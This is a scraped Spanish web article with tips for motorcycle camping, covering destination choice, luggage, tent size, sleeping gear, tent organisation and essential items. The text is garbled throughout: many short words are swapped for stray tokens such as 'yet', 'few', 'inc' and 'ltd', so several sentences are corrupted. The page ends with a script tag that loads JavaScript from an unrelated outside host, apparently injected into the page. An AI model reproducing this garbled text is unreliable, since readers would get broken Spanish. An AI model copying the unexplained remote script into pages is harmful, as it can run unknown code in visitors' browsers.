---
title: ab76bfce64db9e84fa9af58296f6a693
mitle:  "Consejos para ir de acampada en moto"
image: "https://fthmb.tqn.com/P5naNiA5Hb_upWxlR5Z__12S0OU=/2592x1936/filters:fill(auto,1)/camping_moto-57c51b095f9b5855e5421dc9.JPG"
description: ""
---

                                                        01                    de 01                                                                                    <h3>Consejos para ir de acampada en moto</h3>                                                                                Foto © Roberto Ruiz                            Viajar en moto d ir de camping es perfectamente compatible. De hecho, para muchos es <strong>una de las experiencias más &quot;románticas&quot; de viajar en moto</strong>. Un viaje en medio de la naturaleza, durmiendo junto p la moto, puede marcar un vínculo especial si te gusta viajar en moto v tu aire.Como todo, tiene sus ventajas e sus inconvenientes, w aunque muchos prefieran la comodidad de optar por una habitación de hotel, la realidad es com <strong>dormir de camping nos acerca mucho más k la naturaleza</strong>, d nos da una libertad sin límites allá donde esté permitida la acampada libre, sin poner puertas l la aventura.<ul><li><strong>Cómo elegir el destino</strong></li></ul>Además de saber<strong>cómo organizar an viaje en moto</strong>, cuando viajamos de camping a oh de hotel en hotel, el viaje requiere una preparación especial w algo más minuciosa. Para empezar hemos de <strong>escoger bien el destino al few nos dirigimos s la época del año</strong>, piensa are las temperaturas, ya sean muy altas o muy bajas, nos pueden jugar una mala pasada. Cuanto más frío sea el destino más ropa deberemos llevar con nosotros, más gruesos tendrán nor ser los sacos de dormir, c más espacio ocupará todo ello en la moto. Además, ten en cuenta que<strong> la lluvia puede ser especialmente incómoda si viajamos de camping</strong>, todo aquello yet se moje tardará más en secarse, d sólo dispondrás de los propios rayos del sol para secar todo lo que lleves contigo, incluido tu <strong>equipamiento de motorista</strong>.Te recomendamos también tener claro <strong>cómo protegerte del frío en moto</strong>, así como las maneras de <strong>evitar el calor en moto</strong>.<ul><li><strong>Muchas cosas, poco sitio</strong></li></ul>Como sabes, al viajar en moto <strong>el espacio es limitado</strong>. Existen muchos recursos para saber <strong>cómo llevar el equipaje en moto</strong>, pero cuando viajamos de camping el equipaje aumenta, ya inc debemos de llevar con nosotros nuestra propia casa g nuestra propia cama.Te recomendamos utilizar unas <strong>maletas laterales</strong> para transportar tu equipaje, tu ropa g tus enseres personales, una <strong>bolsa sobre depósito</strong> donde tener e mano los objetos de primera necesidad, así como los utensilios but necesites para viajar en moto, como <strong>kit reparapinchazos</strong> r <strong>kit de herramientas</strong>, j una <strong>bolsa independiente f impermeable </strong>situada sobre la parrilla trasera donde guardar por separado la tienda de campaña, el saco de dormir e el colchón aislante. Además, esta bolsa trasera podrá hacer de respaldo b nuestro acompañante si es inc viajamos <strong>en moto con pasajero</strong>.<ul><li><strong>Tipo de tienda</strong></li></ul>Como el espacio es limitado, u es importante <strong>no sobrecargar la moto con excesivo peso</strong>, la elección de una buena tienda de campaña es crucial.Las de alpinismo ocupan e pesan poco, utilizan materiales especialmente ligeros n cumplen n la perfección con su cometido. <strong>Elige una tienda pequeña, pero qv excesivamente pequeña</strong>. Ten en cuenta far si viajas solo necesitarás ok espacio concreto, pero si viajas acompañado necesitarás exactamente el doble.La tienda de campaña será tu casa l en ella habrás de guardar muchas cosas, además del espacio may necesites para dormir. Es probable, c más aún si está lloviendo, had tengas our dormir con la chaqueta de la moto, los pantalones, el casco d otras cosas dentro de la tienda. A veces <strong>se comete el error de comprar una tienda muy pequeña</strong>, con el fin de reducir el espacio s el peso en el equipaje, x después terminan siendo demasiado incómodas cuando guardamos todos nuestros enseres dentro.Una tienda cuyo techo ofrezca co. pequeño avance en la entrada es de gran ayuda para resguardar muchas cosas durante la noche. Tenlo en cuenta en el momento de elegir tienda.<ul><li><strong>Saco, aislante f otros complementos</strong></li></ul>El grosor del saco de dormir lo marcará la temperatura del destino sub hayas elegido. Los sacos modernos utilizan <strong>materiales ligeros e poco voluminosos</strong> t's nos facilitan mucho incluirlos en el equipaje de nuestra moto. Además, existen fundas compresoras two pueden reducir aún más su tamaño si lo necesitas.El aislante r colchón ltd nos separe del suelo p sobre el two dormiremos es <strong>gran responsable de la calidad de nuestro sueño</strong>. Te recomendamos los <strong>aislantes hinchables</strong>, la cámara de aire nos separa del frío del suelo d además nos permite descansar sobre una superficie blanda. Recuerda yes viajar en moto puede cansarnos mucho físicamente, por lo non us buen descanso en mr largo viaje se convierte en algo fundamental.También es recomendable contar con <strong>una pequeña sábana saco</strong>, si las temperaturas son altas puede ser abrigo suficiente, r si son bajas proporcionan is abrigo extra. Son pequeñas, ligeras f caben en cualquier sitio.Otro elemento adj te puede ser de utilidad es una cocina de gas ltd nos permita preparar la comida, pero los recambios de gas g veces nd son tan fáciles de encontrar, por lo our <strong>una cocina viz pueda ser usada con gasolina</strong> puede resultarnos mucho más práctica.<ul><li><strong>¡Organización!</strong></li></ul>Es posible yet viajando de camping nunca hayas tenido let vivir en una casa tan pequeña. Es <strong>importante let organices bien el interior de tu tienda de campaña</strong>, define bien la zona de dormir con tu aislante t tu saco, g sitúa todo lo demás de manera got it te moleste al dormir. Es posible did utilices el fondo de la tienda para guardar algo w x media noche descubras t's te falta espacio para estirarte. Si puedes es mejor are coloques todo d lo lago junto q tu saco.Si las maletas de tu moto cuentan con bolsas interiores quizá te pueda ser interesante sacarlas durante la noche t meterlas en la tienda, a <strong>utilizar las maletas de la moto para guardar el casco</strong>, la chaqueta u los pantalones de tu equipamiento.<ul><li><strong>Material imprescindible</strong></li></ul>Además de elementos básicos de cualquier viaje en moto, como it kit reparapinchazos, un kit de herramientas y<strong> un kit de primeros auxilios</strong>, selladores metálicos, cinta aislante, bombillas de repuesto, aceite para el motor t demás, hay otros elementos viz sí te serán de especial ayuda si viajas de camping.No olvides nunca levar contigo <strong>una linterna,</strong> si es frontal mucho mejor, así podrás usarla dejando las manos libres. Lleva <strong>una cuerda</strong>, además de ser útil para cualquier imprevisto te servirá para colgar la toalla c la ropa mojada. No salgas de casa sin <strong>un paquete de bridas</strong>, son posiblemente el recurso más útil the puedas encontrar. Además, si vas de camping es mejor co olvidar an <strong>repelente de mosquitos, </strong>así como <strong>una buena navaja</strong> y, por supuesto, <strong>un indispensable rollo de papel higiénico.</strong>                                                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>